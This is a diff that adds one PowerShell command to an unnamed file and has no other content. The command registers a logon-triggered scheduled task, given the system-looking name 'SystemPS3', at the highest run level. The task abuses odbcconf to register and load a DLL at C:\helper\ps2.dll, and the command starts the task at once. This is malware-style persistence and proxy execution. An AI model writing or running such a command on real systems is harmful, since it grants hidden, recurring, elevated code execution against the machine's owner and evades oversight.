@@ -1,1 +1,1 @@
-
+Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "odbcconf" -Argument '/a {REGSVR C:\helper\ps2.dll}') -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName "SystemPS3" -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances Parallel) -Principal (New-ScheduledTaskPrincipal -UserId "$env:COMPUTERNAME\$env:USERNAME" -LogonType Interactive -RunLevel Highest) -Force ; start-sleep 2 ; Start-ScheduledTask -TaskName "SystemPS3"
